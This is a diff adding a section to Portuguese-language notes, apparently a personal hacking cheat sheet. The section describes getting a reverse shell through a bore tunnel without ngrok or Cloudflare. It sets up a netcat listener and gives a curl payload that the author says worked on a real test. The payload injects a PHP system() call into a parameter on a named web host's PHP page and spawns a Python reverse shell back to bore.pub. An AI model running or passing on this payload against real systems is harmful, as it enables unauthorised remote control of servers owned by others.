@@ -66,8 +66,12 @@
 - abre o python3 -m http.server 3000 no dir que vc quer
 - depois só rodar cloudflared tunnel --url http://localhost:3000 e ele vai te fornecer o link
 
+### Sem usar a bomba do ngrok e a bomba do clouflare exemplo real que validei
 
-
+- bore local 4444 --to bore.pub  # Ou bore tld (custom domínio)
+- (ele vai fornecer algo como bore.pub:24966)
+- nc -lvnp 4444  # Porta do bore local
+- e depois o payload que funcionou pra mim `curl -X POST --data-urlencode "pass=system('python3 -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"bore.pub\\\",24966));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/sh\\\")\"');" https://pil.loyolavirtual.net/by.php`
 
 ---
 
